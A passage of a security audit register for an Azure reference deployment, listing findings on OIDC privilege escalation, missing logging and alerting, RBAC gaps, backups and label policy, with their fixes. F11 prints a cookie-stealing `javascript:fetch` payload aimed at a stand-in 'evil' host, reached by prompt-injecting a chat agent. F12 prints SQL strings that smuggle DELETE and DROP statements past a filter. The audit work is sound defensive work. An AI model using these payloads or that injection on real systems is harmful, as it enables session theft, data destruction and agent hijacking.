
---

## F7

**`environment: demo` mints an Owner-capable OIDC subject**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.5, 3.1.6, 3.1.7
- **Closed by:** Task 9
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.5.json`, `compliance/assessment/3.1.6.json`, `compliance/assessment/3.1.7.json`

**Where:** `01-root-oidc.ps1:354-355` federates `repo:<r>:environment:demo` to the
deployer; `:358` grants that deployer OWNER on the subscription. `verify-l1.yml:69-72`
declares `environment: demo` AND `id-token: write` while intending to run as the
Reader-scoped verifier. Same shape at `self-heal.yml:683` and `layer-07-apps.yml:336`.

**Key mechanism:** the OIDC subject derives from the JOB'S environment name, NOT from the
`client-id` passed to `azure/login`.

**Attack path:** anything executing in a verify job — a compromised action, a malicious
transitive dependency pulled by the `npm ci` those jobs run, a tampered audit script —
reads `ACTIONS_ID_TOKEN_REQUEST_URL`/`_TOKEN` (job-scoped, present for the whole job),
mints a token with subject `environment:demo`, and exchanges it against
`mls-github-deployer`. Reader to Owner in three HTTP calls. The deployer's consented Graph
roles then give tenant-wide identity write.

**Compounding:** the demo environment is created with a bare
`gh api -X PUT .../environments/demo` (g0-bootstrap.md, `L01.md:41`) — no
deployment-branch policy, no required reviewers. So `environment:demo` is mintable from
ANY ref, not just main. `L01.md:155` asserts the subject "pins deploys to the demo
environment's protection rules"; there are none.

**Fix:** a second environment (`verify`) federated to mls-verifier; verify jobs move to
it; deployment-branch policy on both restricting to main; assert it in `verify-g0.ps1`.

---

## F8

**Application.ReadWrite.All on the deployer**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.5
- **Closed by:** Task 10
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.5.json`

**Where:** `scripts/bootstrap/01-root-oidc.ps1:69`.

**Why it matters more than Owner:** it permits adding a client secret or certificate to
ANY application or service principal in the tenant, including one holding Global
Administrator or `RoleManagement.ReadWrite.Directory`. Repo compromise therefore escalates
to full TENANT compromise — strictly larger than Owner on one subscription.

**Actual usage:** `infra/entra/apply-entra.ps1:415` only creates and updates the three
apps in `manifest.json`, all owned by the deployer.

**Fix:** `Application.ReadWrite.OwnedBy` (`18a4783c-866b-4cc7-a460-3d5e5662c884`), a
drop-in. Note in passing: `Policy.ReadWrite.ConditionalAccess` can disable CA
tenant-wide; retained deliberately because L3 needs it, but it belongs in the risk
register.

---

## F9

**Zero diagnosticSettings anywhere in the estate**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.3.1, 3.3.2, 3.3.5
- **Closed by:** Task 13
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.3.1.json`, `compliance/assessment/3.3.2.json`, `compliance/assessment/3.3.5.json`

**Verified:** grep for `diagnosticSettings|auditingSettings|az monitor diagnostic` across
all Bicep, YAML and PowerShell returns ZERO matches.

**Missing:** Key Vault `AuditEvent` — the estate's only real credentials, the Direct Line
secret and mcp-auth-token, with access entirely unlogged. SQL audit — AVM
`sql/server@0.22.0` defaults `auditSettings { state: 'Enabled' }` with NEITHER
`storageAccountResourceId` NOR `isAzureMonitorTargetEnabled`, and `platform/main.bicep:236-285`
does not override, so auditing is nominally on and writes nowhere (and may hard-fail the
L6 deployment). Also missing: storage blob data-plane logs, Container Apps environment
diagnostics, subscription Activity Log, Entra SignInLogs and AuditLogs.

**Also:** `lawDataRetentionDays` is 30 (`platform/main.bicep:91-93`) against the 90-day
convention AU-11 is assessed at, and DFARS 252.204-7012(e)'s 90-day preservation
obligation.

**Impact:** collapses three NIST families at once — 3.3 outright, 3.6 detection,
3.14.6/.7 — because you cannot alert on data you never collect. Cheapest item on the list
to fix.

**Fix:** `diagnosticSettings` on Key Vault, storage, SQL server and the CAE routed to the
LAW; SQL `auditSettings` with `isAzureMonitorTargetEnabled: true`; Activity Log and Entra
diagnostics via the L2/L3 workflows; retention 30 to 90. `dailyQuotaGb: '1'` already
bounds the cost.

---

## F10

**NIST policy identity holds standing Contributor it can never use**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** 3.1.5
- **Closed by:** Task 11
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.5.json`

**Where:** `infra/bicep/landing-zone/main.bicep:225` (`enforcementMode: 'DoNotEnforce'`)
and `:228` (`roleDefinitionIds: [contributorRoleId]` with `identity: 'SystemAssigned'`).

**Fact:** ARM requires an IDENTITY when an initiative contains
`deployIfNotExists`/`modify` members. It does NOT require any role assignment. In
`DoNotEnforce` no remediation ever runs, so the identity has nothing to do with the
Contributor grant it holds.

**Impact:** a permanent subscription-scoped Contributor principal nobody owns or
monitors, reachable by anyone who can create a remediation task, surviving RG-scoped
teardown because the assignment lives at subscription scope.

**Fix:** `roleDefinitionIds: []`. The identity is still created and the assignment
validates.

---

## F11

**`javascript:` href accepted in Adaptive Cards; no CSP**

- **Severity:** high
- **Confidence:** CONFIRMED (path traced end to end)
- **Controls:** 3.14.1
- **Closed by:** Task 14
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.14.1.json`

**Where:** `apps/control-tower/src/AdaptiveCardView.tsx:194-202` (Action.OpenUrl) and
`:123-127` (Image). `str()` at `:60` checks only "non-empty string".

**Chain verified:** Fluent's `useLinkBase_unstable` passes `href` straight to `<a>` with
NO scheme sanitization (`useLinkState` only blanks it when disabled); React `^18.3.1`
renders `javascript:` with a dev-only warning, it does not block; control-tower's
`nginx.conf.template` emits NO Content-Security-Policy, so `script-src 'self'` — which
would neutralise a `javascript:` URI — is absent.

**Source of the card:** the Copilot Studio agent over Direct Line, handed to the renderer
verbatim (`agent/transcript.ts:44-50` casts `attachment.content` to `AdaptiveCard` with no
validation).

**Attack path:** prompt-inject the agent into emitting
`{"type":"Action.OpenUrl","title":"View report","url":"javascript:fetch('https://evil/'+document.cookie)"}`.
An operator clicks a plausible-looking button and script executes in control-tower's
origin, where the live Direct Line token is in JS memory and the same-origin `/api/*`
proxy to data-api is reachable.

**The tell:** the sibling renderer already does this correctly —
`apps/shared/spec-renderer/src/markdown.tsx:14` constrains hrefs to `https?://` in the
tokenizer. The Adaptive Card path never got the same treatment.

`Image.url` has the same gap. `javascript:` does not execute in `img src`, so that one is
an outbound beacon / exfiltration channel rather than XSS.

**Also:** `apps/control-tower/Dockerfile:24` and `apps/launch-ops/Dockerfile:24` have NO
`USER` directive — both nginx frontends run as root. `data-api:73` and `mcp-tools:45`
correctly drop to `USER node`. Looks like oversight.

**Fix:** an `/^https?:\/\//i` guard on both `Action.OpenUrl.url` and `Image.url`; CSP,
nosniff and Referrer-Policy on both nginx templates; `USER nginx` on both frontend
Dockerfiles.

---

## F12

**SQL gate: unterminated comment or quote swallows the tail**

- **Severity:** medium
- **Confidence:** CONFIRMED (reproduced against the real gate)
- **Controls:** 3.14.1
- **Closed by:** Task 15
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.14.1.json`

**Where:** `apps/mcp-tools/src/tools/sql-dialect.ts:154-166` (nesting), `:229-265` (all
three checks run on the SCRUBBED text), `:267` (returns the RAW text).

**Root cause:** the comment at `:154` claims nesting "cannot under-scrub either dialect".
True for T-SQL, which nests. SQLite does NOT nest, so `/* a /* b */` is a CLOSED comment
to SQLite and an UNCLOSED one to `scrubSql`, which then eats the rest of the input.

**Reproduced by the controller:**
- `SELECT 1 /* a /* b */ ; DELETE FROM launches` — PASSES the gate, both sqlite and tsql
- ``SELECT 1 ` ; DROP TABLE launches`` — PASSES the gate, sqlite
- The scrubbed text the checks saw was `"SELECT 1  "`. Both the semicolon scan and the
  forbidden-verb scan are blind to everything after the fake opener. The same trick works
  with an unterminated `'`, `[` or `"`.

**Not exploitable today, verified rather than assumed:** `queryLakehouse` uses
`db.prepare()`, which compiles only the first statement — run against a live sql.js
database, the hidden DELETE did not run. sql.js is built without `load_extension`. T-SQL
nests identically, so the region is genuinely a comment there.

**Why it still matters:** the safety property is `db.prepare`'s single-statement
compilation, NOT the gate. That is incidental, and one refactor from being lost —
`lakehouse.ts` already uses `db.run`/`db.exec` three lines up (118, 122, 134), and
`db.exec("SELECT 1; DELETE FROM launches")` DOES execute both (verified: row count went
to 0). For a published reference implementation, a gate that hands `; DELETE FROM
launches` to the engine and calls itself a single-statement gate is the wrong thing to
model.

**Fix:** `scrubSql` returns a structural-validity flag; reject any statement ending with
an unclosed comment, quote, backtick or bracket. Make nesting dialect-aware.

---

## F13

**Zero workload RBAC expressed in IaC**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.1.2, 3.1.5
- **Closed by:** Task 12, then F24, then F19
- **Status:** CLOSED
- **Closed (2026-08-28, commit c33f06e):** all seven of the documented workload RBAC grants are now expressed in code. Five landed in Task 12 (commit 344063b) and Task 17 (commit 08ff769); the sixth -- data-api -> Fabric workspace Viewer -- was *expressed but never invoked* until F24 wired it; the seventh -- cost-ingest -> Storage Blob Data Reader -- landed with F19, which provisioned the Function App and the user-assigned identity that grant needed a principal for. It is scoped to the `cost-exports` **container**, not the account, in `infra/bicep/platform/modules/blob-container-role.bicep`. `key-vault-secrets-user-role.bicep`, the third clause of the Fix below, was repurposed rather than deleted at Task 5 (F2's infra half). **NOT claimed, and carried forward as a recommendation rather than quietly dropped:** the Fix's middle clause -- "add a V7.x criterion asserting each principal holds exactly its expected roles and no others" -- is still unimplemented. Nothing in this estate has ever been deployed, so a live-tenant criterion has never had anything to assert against; what exists instead is static, repo-level: `verification/tests/workload-rbac.Tests.ps1` and `verification/tests/cost-ingest.Tests.ps1` assert each grant by role definition GUID and by scope, and both refuse any GUID outside the documented set. That is a guard on what the repository *declares*, not on what a tenant *holds*, and the two are not the same claim. See `compliance/assessment/3.1.1.json`, `compliance/assessment/3.1.2.json`, `compliance/assessment/3.1.5.json`.
- **Superseded status line, kept because the register's history is part of its value:** "six of seven workload RBAC grants have now landed. Five landed in Task 12 (commit 344063b) and Task 17 (commit 08ff769); the sixth -- data-api -> Fabric workspace Viewer -- was *expressed but never invoked* until F24 wired it, because `provision-workspace.ps1`'s `-DataApiPrincipalId` parameter had no caller and structurally could not have one at L5. The seventh (cost-ingest -> Storage Blob Data Reader) remains blocked on F19, which has no Function App or identity to grant it to." — true until 2026-08-28, superseded by the line above. An earlier revision of this line claimed six had landed while the data-api Fabric grant was still unwired; that was wrong and F24 records it. See `compliance/assessment/3.1.1.json`, `compliance/assessment/3.1.2.json`, `compliance/assessment/3.1.5.json`.

**Verified:** ZERO `az role assignment` invocations across `.github/`, `scripts/`,
`infra/`, `data/`. ZERO `roleAssignments:` parameters to any AVM module. The ONLY
`Microsoft.Authorization/roleAssignments` resource in the tree is
`infra/bicep/apps/modules/key-vault-secrets-user-role.bicep` — documented as
UNREFERENCED in three places (`apps/main.bicep:111`, `infra/bicep/README.md:24` and
`:178`) and whose own header says it exists "needed by copilot-svc to resolve its
ANTHROPIC_API_KEY secret reference". `copilot-svc` was deleted by the 2026-08-24
amendment; no Anthropic key exists.

**The only grants that exist:** deployer to Owner, verifier to Reader, both in
PowerShell at subscription scope. So privilege is INVERTED — maximum where automated,
undefined where documented.

**Seven grants documented in prose and implemented nowhere:**

| Principal | Grant | Documented at |
|---|---|---|
| data-api | SQL contained-database user | `apps/main.bicep:637` |
| data-api | Fabric workspace Viewer | `apps/main.bicep:637` |
| data-api, mcp-tools | Log Analytics Reader | `apps/main.bicep:637`, `tools/cloud/log-analytics.ts:14` |
| data-api, mcp-tools | Security Reader | `apps/main.bicep:637`, `tools/cloud/defender-posture.ts:18` |
| mcp-tools | Cost Management Reader | `apps/main.bicep:101`, `tools/auth.ts:92` |
| Cost Management service | Storage Blob Data Contributor | `platform/main.bicep:301` |
| cost-ingest | Storage Blob Data Reader | `apps/cost-ingest/README.md:143` |

**NOT just compliance — a dated failure.** `apps/main.bicep:263`:
`var dataApiMode = empty(dataApiBackendMode) ? (empty(fabricSqlEndpoint) ? 'local' : 'cloud') : dataApiBackendMode`
flips data-api to CLOUD as soon as `fabricSqlEndpoint` is set, which G0 item C9 has you
do after L5. At that moment data-api 403s on every backend call. Lands days 7-14 of the
30-day window, presenting as a mysterious runtime failure rather than a configuration
error.

**Also** breaks the repo's own first principle — "no manual portal configuration outside
G0" (`docs/BRIEF.md:95-97`) — at the authorization layer, the worst place for an
unwritten step.

**Fix:** express all seven in IaC; add a V7.x criterion asserting each principal holds
exactly its expected roles and no others; delete or repurpose
`key-vault-secrets-user-role.bicep`.

---

## F14

**self-heal branch-squatting kill switch and missing ref filter**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability)
- **Closed by:** Task 16
- **Status:** CLOSED

**Where:** `.github/workflows/self-heal.yml:252` —
`gh pr list --state open --json headRefName --jq '.[].headRefName' > open-branches.txt`,
then `:255-259` skips any alert whose number appears in a `self-heal/<kind>-<n>-` branch
name.

**Attack path:** `gh pr list` enumerates ALL open PRs including forks, and the attacker
controls their own head-branch name. Once public, open 50 throwaway fork PRs named
`self-heal/dependabot-1-x` through `-50-x`. Every alert now looks handled, `:261` sets
`found=false`, and the run reports "Nothing to heal" and concludes GREEN. Alert numbers
are small sequential integers, so no reconnaissance is needed. Works on code-scanning
too.

**Impact:** an outsider gets a SILENT kill switch for the demo's centrepiece, and
V10.1/V10.2 fail their 24-hour window with no error anyone will notice — the workflow
reports success.

**Separately,** `:242`: `repos/{r}/code-scanning/alerts?state=open` has no `ref=` filter,
so alerts raised on fork-PR CodeQL analyses (`codeql.yml:23-24` runs on `pull_request`)
are in scope.

**Fix:** scope the PR list to `headRepositoryOwner.login ==` the base repo owner, or use
`git/matching-refs/heads/self-heal/`; add `ref=refs/heads/main` to the alerts endpoint
and assert `most_recent_instance.ref` before proceeding.

**Note:** this finding maps to no NIST SP 800-171 control — it is an availability
finding against the self-healing pipeline's own integrity, not a CUI-protection gap. It
is tracked here, and in the findings table, so it does not fall through the gap between
the security and compliance framings.

**Closed (Task 16):** the branch-squat check now asks
`gh api repos/${REPO}/git/matching-refs/heads/self-heal/`, scoped to the base
repository's own ref namespace rather than filtering `gh pr list`'s fork-visible
results — a fork's branch lives in the fork's own namespace and can never appear
there, which sidesteps the fork question rather than filtering for it, and needs
only `contents: read` (verified empirically against a real public repo: zero
matches returns HTTP 200 with `[]`, never a 404, so a clean repo with no open
self-heal branches yet still heals correctly). The code-scanning alert listing
now carries `ref=refs/heads/<default_branch>` (resolved dynamically, not
hardcoded), and `.most_recent_instance.ref` is re-checked directly against that
target in two independent places: inside the `select` job's own listing filter,
and again as the first step of the `autofix` job — the latter because an alert
number can also arrive via `workflow_dispatch`/`repository_dispatch`, which
bypasses the `select` job's listing (and its `ref=` filter) entirely.
`verification/tests/self-heal-selection.Tests.ps1` is a workflow-shape regression
guard for both changes; it fails against the pre-fix file and passes against the
fixed one. F14 maps to no control, so unlike a finding with an 800-171 mapping
there is no `compliance/assessment/*.json` to update — this Status field and the
plan's Task 16 outcome note are F14's only closure record, same as F15's will be.

---

## F15

**Cost export non-functional; the backstop behind every wallet finding**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (cost control)
- **Closed by:** Task 17
- **Status:** CLOSED

Three defects:

1. **Container name mismatch.** `infra/bicep/platform/main.bicep:309` creates
   `cost-exports` ("container name pinned by the L6 audit (V6.3)");
   `layer-06-platform.yml:232` writes to `--storage-container costexports`. Different
   container.
2. **No data-plane grant.** `allowSharedKeyAccess: false` (`platform/main.bicep:304`)
   forces the RBAC write path, and the comment at `:300-303` says the layer-06 workflow
   grants Storage Blob Data Contributor to the Cost Management service identity.
   `grep -rn "az role assignment create" .github/ scripts/` returns no non-test hits. The
   grant does not exist; the export cannot write.
3. **The budget alone is thin.** `scripts/bootstrap/03-budget.ps1` sets $75/month with
   notifications at 50/80/100%, ALL `thresholdType 'Actual'` (`:127`), email-only, no
   action group. Cost Management actual-cost data lags 8-24 hours. A Friday-evening flood
   against the unauthenticated data-api burns the credit before the first email arrives.

**Fix:** align the container name; add the Storage Blob Data Contributor grant; add
`Forecasted` notifications at 50% and 80% alongside the actual ones.

**Note:** this finding maps to no NIST SP 800-171 control — it is a cost-control finding,
not a CUI-protection gap. It is tracked here, and in the findings table, so it does not
fall through the gap between the security and compliance framings.

**Closed (Task 17):** all three defects fixed. (1) `layer-06-platform.yml` now writes to
`cost-exports`, matching `infra/bicep/platform/main.bicep` and the V6.3 audit's default
container name — one container, not two. (2) The grant is real and targets a real
identity: `az costmanagement export create`/`update` has no `--identity-type` flag, and
the costmanagement CLI extension pins API version 2020-06-01, which hard-requires the
destination storage account's shared keys to be enabled
(github.com/Azure/azure-cli/issues/32912) — it would 400 outright against this account's
`allowSharedKeyAccess: false`, so the Bicep comment's claim was unreachable as written,
not merely unimplemented. The fix creates the export via `az rest` against the Exports
REST API directly (api-version 2023-08-01), which supports both RBAC-only storage and an
explicit `identity: { type: SystemAssigned }` request in the PUT body; the response
returns that identity's `principalId` synchronously, and the workflow grants it Storage
Blob Data Contributor — scoped to the `cost-exports` container, not the whole account —
via an idempotent `az role assignment create` keyed on the `principalId` (never a
resourceId or clientId, the same caution Task 12 left behind). (3) `Forecasted`
notifications at 50% and 80% now run alongside the existing `Actual` ones at 50/80/100%
in `scripts/bootstrap/03-budget.ps1` — additive, not a replacement, since Actual is still
the ground truth once its 8-24h lag clears.
`scripts/bootstrap/tests/03-budget.Tests.ps1` is a regression guard for the third fix; it
fails against the pre-fix script (every notification `Actual`) and passes against the
fixed one. F13's table entry for "Cost Management service -> Storage Blob Data
Contributor" is correspondingly DONE; F13 itself stays OPEN on F19 alone (see
`compliance/assessment/3.1.1.json`, `3.1.2.json`, `3.1.5.json`).

---

## F16

**Azure SQL backup posture never decided or verified**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** CP-9 (NIST SP 800-53 Rev 5 — tailored out of 800-171, still probed by
  CMMC assessors)
- **Closed by:** Task 18
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/CP-9.json`

**Where:** `infra/bicep/platform/main.bicep:236-285` (`module sqlServer`), specifically
the `databases` array at `:264-282`. No `shortTermRetentionPolicy`,
`longTermRetentionPolicy`, or `requestedBackupStorageRedundancy` property is set on the
server or the database. `verification/layer-06-audit.ps1` (V6.1–V6.4) checks SKU,
auto-pause delay, min/max capacity, LAW connectivity and cost-export presence
field-for-field (`:113-114`), but no criterion anywhere in that file reads backup
configuration.

**Confirmed absent, not merely undocumented:** grep for
`shortTermRetention|longTermRetention|requestedBackupStorageRedundancy|backupStorageRedundancy`
across `infra/` and `verification/` returns zero matches.

**Impact:** Azure SQL always takes automated backups even when a template asks for
nothing — but the retention window and the backup storage redundancy tier are
consequently whatever the platform default resolves to on a given deployment day, not a
decision this repo made, documented, or checks. Every other SQL property that matters to
the master plan is pinned and audited field-for-field (`sqlAutoPauseDelayMinutes`,
`sqlMinCapacity`, `sqlMaxCapacity` all have a V6.1 criterion asserting the exact value);
backup posture is the one property nobody looked at. An adopter who copies this template
for a system that does hold CUI inherits an undecided retention window and an undecided
cross-region replication footprint for backup data — the latter would also quietly widen
the single-region residency boundary the `allowedLocations` policy
(`infra/bicep/landing-zone/main.bicep:181-211`) otherwise pins for live resources.

**Fix:** set `requestedBackupStorageRedundancy` and a `shortTermRetentionPolicy`
(retention days) explicitly on the `databases` array entry, matching the redundancy tier
appropriate to the data classification in play; add a V6.x criterion asserting the values
so a future change is caught rather than silently defaulted.

**Closed (Task 18):** the brief's own property name was wrong for this AVM module
version — `avm/res/sql/server@0.22.0` rejects `shortTermRetentionPolicy` (confirmed via
`az bicep build`, which names the real property in its BCP037 permissible-properties
list); the correct property is `backupShortTermRetentionPolicy`. `requestedBackupStorageRedundancy`
was named correctly as-is. `platform/main.bicep`'s `databases` array entry now sets
`backupShortTermRetentionPolicy: { retentionDays: sqlBackupRetentionDays }` (default 7)
and `requestedBackupStorageRedundancy: sqlBackupStorageRedundancy` (default `'Local'`,
matching the single-region design the `allowedLocations` policy otherwise pins — `Geo`/
`GeoZone` would replicate backup data cross-region without a corresponding decision to do
so). Both are now-explicit template parameters, restated in `demo.bicepparam` next to the
existing spend-profile block. No `backupLongTermRetentionPolicy` is set: the database
holds seeded synthetic data with a deterministic regenerator (`data/seed/`), not data an
LTR vault needs to protect, so adding one was out of this finding's scope — an adopter
holding real data should make that a deliberate addition of their own, not inherit it
from this reference template. `verification/layer-06-audit.ps1` gains a V6.5 criterion
(`Test-SqlBackupPosture`) asserting both values by ARM GET — `requestedBackupStorageRedundancy`
is a top-level database property, but `retentionDays` lives on the child
`backupShortTermRetentionPolicies/default` resource, reached via a plain `az resource
show` rather than the dedicated `az sql db str-policy show` command (which takes a
different, `--resource-group`/`--server`/`--database` argument shape than the resource-id
pattern every other V6.x criterion in this file already uses). V6.5 is NOT a master-plan
criterion, so it is documented in `docs/runbooks/layers/L06.md` § Validation cycle but
deliberately not added to the 43-row master-plan traceability table in
`docs/runbooks/layers/README.md`, which that file's own header states is scoped exactly
to master-plan criteria (same convention `L04.md` already uses for its own
non-master-plan supplementary check). TDD: 6 new/updated assertions in
`verification/tests/layer-06-audit.Tests.ps1` failed against the pre-fix script (V6.5
absent — `Should -Be $null` rather than `FAIL`/`PASS`, and the two existing criterion-count
assertions off by one), confirmed by running the test file before `Test-SqlBackupPosture`
existed; all pass after the fix. CP-9 closes outright — F16 was its sole contributor (see
`compliance/assessment/CP-9.json`).

---

## F17

**Zero alert rules or action groups anywhere in the estate**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** SI-4, IR-4 (NIST SP 800-53 Rev 5 — both tailored out of 800-171)
- **Closed by:** Task 19
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/SI-4.json`, `compliance/assessment/IR-4.json`

**Verified:** grep for `metricAlerts|scheduledQueryRules|actionGroups|activityLogAlert`
across every `.bicep`, `.ps1` and `.yml`/`.yaml` file in the repo returns ZERO matches.
The only `az monitor` invocations anywhere are read-only queries the Verifier runs by
hand — `az monitor log-analytics query` (`verification/layer-06-audit.ps1:287`,
`verification/layer-07-audit.ps1:346`) and `az monitor activity-log list`
(`verification/layer-02-audit.ps1:158`, `verification/layer-09-audit.ps1:302`) — none of
which creates a standing alert.

**Distinct from F9:** F9 established that almost nothing is logged. This finding is that
even once F9's fix lands and Key Vault `AuditEvent`, SQL audit, storage logs and CAE
diagnostics all route to the Log Analytics workspace, nothing is subscribed to any of it.
No `Microsoft.Insights/metricAlerts` on SQL DTU, storage, or connection-failure metrics;
no `scheduledQueryRules` against the workspace (a spike in Key Vault `AuditEvent` denials,
repeated SQL auth failures, unexpected Container Apps restarts); no
`Microsoft.Insights/actionGroups` to receive any of it. `scripts/bootstrap/03-budget.ps1`
is the one place any notification exists in the whole system, and F15 already records
that those notifications are cost-only, email-only and actual-spend-only — this finding
is the general case: there is no alerting *capability* anywhere, security or operational.

**Impact:** the estate can detect nothing about itself. An operator learns of a
security-relevant event only by manually running a KQL query that nobody is scheduled to
run. This collapses the alerting half of SI-4 (system monitoring — alert on indicators of
compromise) and removes the only automated trigger IR-4's incident-handling capability
(detection is its first phase) would have to act on. F9's fix, on its own, buys
visibility only to someone who thinks to go looking; this is the gap that would actually
close the loop.

**Fix:** at minimum, a `Microsoft.Insights/actionGroups` resource (email or webhook) plus
a small set of `scheduledQueryRules`/`metricAlerts` against the signals F9 will start
collecting — Key Vault access-denied spikes, SQL failed-login spikes, Container Apps
environment health. Route the budget action group F15 adds to the same action group so
cost and security alerting share one page-out path.

**Closed (Task 19), with two corrections to this finding's own Fix text.** First:
F15/Task 17 never added an action group — it uses Cost Management's native
`contactEmails` notification receivers (`scripts/bootstrap/03-budget.ps1`), a different
subsystem (`Microsoft.Consumption/budgets`) from Azure Monitor's
`Microsoft.Insights/actionGroups`. There was no existing action group to route into.
Second: Container Apps environment health was dropped from the rule set, not
implemented — the individual container app resources a meaningful restart metric would
attach to do not exist at L6 (they deploy at L7, `apps/main.bicep`), so a `metricAlert`
cannot be authored in this template without an app resource id it never sees, and a
log-based proxy at the environment scope has no Microsoft-documented column/category
contract precise enough to write with confidence absent a live workspace to check it
against — exactly the condition this task's own brief named as a reason to stop and
verify rather than guess.

What landed instead, scoped deliberately to two rules rather than the brief's three:
`platform/main.bicep` adds one `Microsoft.Insights/actionGroups` (email receiver, the
same sponsor address `03-budget.ps1` already notifies) and two
`Microsoft.Insights/scheduledQueryRules`, both querying the `AzureDiagnostics` table
(the destination F9's diagnostic settings use by default — no
`logAnalyticsDestinationType` override exists anywhere in this template) in the Log
Analytics workspace F9 routes diagnostics to: a Key Vault `AuditEvent` denied-result
spike (`httpStatusCode_d >= 300`, the field Microsoft's own Key Vault logging guidance
and third-party samples both use for denied/failed requests — the vault holds the Direct
Line secret and `mcp-auth-token`) and an Azure SQL failed-login spike
(`SQLSecurityAuditEvents`, `succeeded_s == "false"`, a field confirmed against
independent published KQL examples against the Entra-only server F13's workload grants
authenticate through). Both rules are named verbatim by this finding's own Fix text
("Key Vault access-denied spikes, SQL failed-login spikes") and that is their
justification — **not** detection coverage of F1, F2 or F3, a claim an earlier pass of
this closure wrongly made and a review round caught. F1/F2/F3 are app-layer
authentication bypasses: an unauthenticated caller reaches the app, and the app's own
already-privileged managed identity then talks to Key Vault and SQL successfully, with
no access-denied event and no failed login anywhere in that path — the platform sees a
legitimate identity doing legitimate things, so neither rule would ever have fired for
that exploit class. What these two rules actually detect is narrower and different in
kind: probing or misconfiguration against Key Vault and Azure SQL directly (an
unexpected denial, an unexpected failed login), generalising F9's collection to the two
surfaces that hold the estate's real credentials and its Entra-only workload auth. A
third, cost/usage-spike rule — the fourth class this task's own scope-discipline
guidance named — was deliberately not duplicated either: Task 17/F15 already added
`Forecasted` budget notifications for exactly that gap, and a second, KQL-approximated
mechanism would be redundant against an existing, purpose-built one. Both rules
evaluate every 15 minutes; Azure's scheduled-query-rule cost boundary sits at 5
minutes — any interval at or above it is flat-priced, and only sub-5-minute
frequencies cost materially more (per published per-tier price lists) — so 15 minutes
sits inside that flat band rather than at some specially cheap point within it;
combined cost is on the order of a dollar or two per month, comfortably inside the
$200/30-day credit and the workspace's `dailyQuotaGb: '1'` ingestion cap.

On the routing correction: `scripts/bootstrap/03-budget.ps1` gains an optional
`-ActionGroupResourceId` parameter (empty by default) that adds the new action group to
every notification's `contactGroups` (Cost Management budgets support action groups
natively via this field, additive alongside `contactEmails`, never a replacement) —
empty by default because this script runs at G0, which precedes L6 on every
`infra-up.yml` pass, so the action group this parameter would reference does not exist
yet the first time a sponsor runs it. A documented, idempotent re-run with
`-ActionGroupResourceId` once L6 has deployed adds it as a supplementary contact,
achieving the "share one page-out path" goal without this template inventing a
same-pass ordering guarantee that does not hold. TDD: 7 new assertions in
`verification/tests/alerting.Tests.ps1` (new file, text-pattern regression guard on
`platform/main.bicep`, same shape as `diagnostics.Tests.ps1`) and 6 new assertions in
`scripts/bootstrap/tests/03-budget.Tests.ps1` all failed against the pre-fix files
(confirmed by running both suites before the corresponding implementation existed); all
pass after the fix. SI-4 and IR-4 both close outright — F17 was each control's sole
contributor (see `compliance/assessment/SI-4.json`, `compliance/assessment/IR-4.json`).

---

## F18

**Sensitivity labels published nowhere — a taxonomy, not a control**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** CM-6 (NIST SP 800-53 Rev 5 — tailored out of 800-171)
- **Closed by:** Task 20
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/CM-6.json`

**Where:** `infra/purview/labels.ps1` — `Initialize-SensitivityLabel` (`:85-116`) calls
only `New-Label` (`:111`, create path) and `Set-Label` (`:104`, drift-update path);
`Invoke-Main` (`:118-129`) loops the four-label taxonomy through it and returns. No
`New-LabelPolicy`, `Set-LabelPolicy`, or any publish/scope cmdlet appears anywhere in the
134-line file, or in its test file `infra/purview/tests/labels.Tests.ps1`.

**Documented as done, never implemented:** `docs/runbooks/layers/L04.md:53` lists
"publishes the label policy scoping the labels to the demo users' groups" as the second
of three things the L4 deploy step does. It does not — the script that bullet describes
performs only the first (`L04.md:51`, create-if-absent) and third (`:54`, record GUIDs)
of the three. `L04.md`'s next step also points at `infra/purview/auto-label-design.md`
for the (separately unimplemented) auto-labeling policy; that file does not exist in the
repo.

**Also unverified:** `verification/layer-04-audit.ps1`'s `Test-LabelTaxonomy` (V4.1,
`:65-95`) and `Test-LabelPersistence` (V4.2, `:97-120`) both call `Get-LabelSnapshot` →
`Get-Label` and compare label existence/GUIDs; grep for `LabelPolicy` in that file returns
zero matches. So even the Verifier's independent audit — which CLAUDE.md and the brief
hold up as the substitute for routine human review — reports L4 healthy while the labels
remain unpublished.

**Impact:** a Purview sensitivity label with no policy scoping it to any user, group, or
location does not appear in any Office/Purview client, cannot be applied to a document or
email, and triggers no downstream protection action. The four labels exist as directory
objects with GUIDs the L4 audit can enumerate, and nothing else. A label that is never
published to a user enforces nothing — it is a taxonomy, not a control. For a reference
implementation this is the same shape of gap as F2 (a control that reads as present in
design and is absent in the shipped artifact) and F13 (grants documented in prose,
implemented nowhere), here in the data-governance layer instead of the auth layer.

**Fix:** add a `New-LabelPolicy`/`Set-LabelPolicy` step to `labels.ps1` publishing the
four labels to the demo user/group scope `L04.md` already names; extend
`verification/layer-04-audit.ps1` with a V4.3 criterion asserting the policy exists and is
scoped as expected; author `infra/purview/auto-label-design.md` or drop the `L04.md`
reference to it.

**Closed (Task 20):** the controller's ruling on this task found the brief under-scoped
it — a third defect of the identical shape (`L04.md` asserting behaviour `labels.ps1`
never implemented) sat one section below the one the brief named. `L04.md:57-60` claimed
the `mls-operations` auto-label policy was "applied by the same script where the AIP-P2
entitlement is present (checked at runtime)"; `labels.ps1` had no auto-label function and
